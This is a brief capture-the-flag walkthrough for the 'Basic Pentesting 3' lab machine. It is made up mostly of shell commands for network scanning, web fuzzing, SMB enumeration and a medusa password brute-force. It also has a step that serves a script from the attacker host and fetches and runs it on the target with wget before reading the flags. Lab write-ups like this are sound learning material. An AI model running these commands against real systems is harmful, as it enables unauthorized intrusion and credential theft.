# Anas-EPI-Basic-pentesting-3-walkthrough-


## Identifying the Target

To begin, we need to identify the IP address of the target machine:

```bash
sudo netdiscover -r 192.168.56.0/24

```

## Scanning Open Ports

Next, we scan the open ports on the target machine:

```bash
sudo nmap -v -T4 -A -p- -oN nmap.log 192.168.56.105
```

## Enumerating Web Server

We perform directory fuzzing on the web server to find interesting paths:

```bash
gobuster dir -u http://192.168.56.105 -x txt,php,html,bak --wordlist /usr/share/wordlists/dirb/common.txt -o dir.log
```

## Enumerating SMB Server

Moving on to the SMB server, we use smbmap to verify anonymous access and attempt password cracking:

```bash
smbmap -H 192.168.56.105
medusa -u albert -P /home/kali/rockyou.txt -h 192.168.56.105 -M smbnt
```

## Logging into Shares

With valid credentials, we log into the shares and download relevant files:

```bash
smbclient \\\\192.168.56.105\\smbshare -U albert
smbclient \\\\192.168.56.105\\albert -U albert
```

## Exploiting Vulnerabilities

We exploit vulnerabilities found in files downloaded from shares:

```bash
vi smbscript.sh
python3 -m http.server
wget http://192.168.56.10:8000/script.sh
wget http://192.168.56.10:8000/wordlist.txt
chmod +x script.sh
./script.sh wordlist.txt validpass.txt
```

## Retrieving Flags

Finally, we retrieve the user and root flags:

```bash
cat user.txt
su root
cat root.txt
```
